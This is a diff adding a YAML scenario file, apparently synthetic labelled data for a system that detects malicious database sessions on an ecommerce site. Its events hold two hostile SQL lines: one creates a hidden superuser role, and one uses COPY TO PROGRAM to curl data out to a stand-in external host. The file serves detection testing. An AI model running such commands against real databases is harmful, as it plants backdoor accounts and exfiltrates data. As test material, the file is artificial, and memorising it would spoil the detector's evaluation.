@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_61_data_tamper_mal_1782
+family_id: gen_ecommerce_61_data_tamper_mal_fam1782
+domain: ecommerce
+time_of_day: 00:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_848477 SUPERUSER LOGIN PASSWORD 'x755762'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.32.24.158
+      port: 443
